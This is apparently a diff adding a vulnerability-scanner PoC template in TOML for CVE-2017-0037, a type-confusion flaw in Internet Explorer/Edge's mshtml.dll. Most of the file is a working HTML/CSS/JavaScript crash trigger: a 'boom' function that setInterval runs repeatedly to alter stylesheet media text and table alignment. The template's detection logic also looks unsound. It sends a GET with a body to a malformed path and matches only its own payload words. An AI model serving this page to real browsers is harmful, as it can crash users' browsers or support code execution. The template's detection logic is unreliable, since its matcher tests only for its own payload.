@@ -1,0 +1,60 @@
+[info]
+author = "AVE"
+description = "通过构造包含特定CSS和JavaScript的HTML页面，触发Microsoft Internet Explorer/Edge中mshtml.dll的HandleColumnBreakOnColumnSpanningElement类型混淆漏洞，导致浏览器崩溃或远程代码执行"
+id = "POC-AVE-2017-0006"
+name = "CVE-2017-0037 PoC"
+severity = "high"
+tags = [
+    "cve-2017-0037",
+    "type-confusion",
+    "mshtml",
+]
+vuln_id = [
+    "CVE-2017-0037",
+    "AVE-2017-0006",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2017-0037-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+.class1 { float: left; column-count: 5; }
+.class2 { column-span: all; columns: 1px; }
+table {border-spacing: 0px;}
+</style>
+<script>
+function boom() {
+  document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
+  th1.align = "right";
+}
+</script>
+</head>
+<body onload="setInterval(boom,100)">
+<table cellspacing="0">
+<tr class="class1">
+<th id="th1" colspan="5" width=0></th>
+<th class="class2" width=0><div class="class2"></div></th>
+</tr>
+</table>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "boom",
+    "setInterval",
+]
